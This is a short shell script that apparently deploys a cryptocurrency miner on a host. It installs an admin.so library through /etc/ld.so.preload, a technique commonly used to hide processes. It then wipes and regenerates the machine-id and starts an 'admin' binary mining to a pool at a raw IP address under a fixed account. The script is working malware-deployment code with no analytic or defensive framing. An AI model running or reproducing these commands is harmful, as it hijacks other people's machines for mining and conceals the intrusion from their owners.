mv admin.so /usr/local/lib/admin.so
mv ld.so.preload /etc/ld.so.preload
sleep 5
rm -rf /etc/machine-id
rm -rf /var/lib/dbus/machine-id
dbus-uuidgen --ensure
systemd-machine-id-setup
cat /etc/machine-id
sleep 2
./admin --algo ore --account CP_3wf3t9wmft --pool 47.238.54.68:9092 --cpu-off
